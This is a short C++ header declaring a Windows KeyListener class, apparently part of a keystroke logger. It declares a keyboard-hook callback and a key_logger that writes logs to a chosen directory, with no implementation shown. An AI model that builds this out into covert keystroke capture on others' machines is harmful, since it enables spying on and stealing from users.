#ifndef KEY_LISTENER_INTERNALS_H
#define KEY_LISTENER_INTERNALS_H

#include <string>
#include <fstream>
#include <windows.h>

#include "key_listener_exports.h"
#include "logger.h"

class KeyListener {
    public:
        KeyListener(string &dir_to_save_logs);
        ~KeyListener();
        void fnPressCallback (
		    int nCode,
		    WPARAM wParam,
		    LPARAM lParam
		);

    private:
        Logger key_logger;
        Logger debug_logger;
};

static LRESULT CALLBACK key_listener_press_callback_procedure (
    int nCode,
    WPARAM wParam,
    LPARAM lParam
);

#endif /* KEY_LISTENER_INTERNALS_H */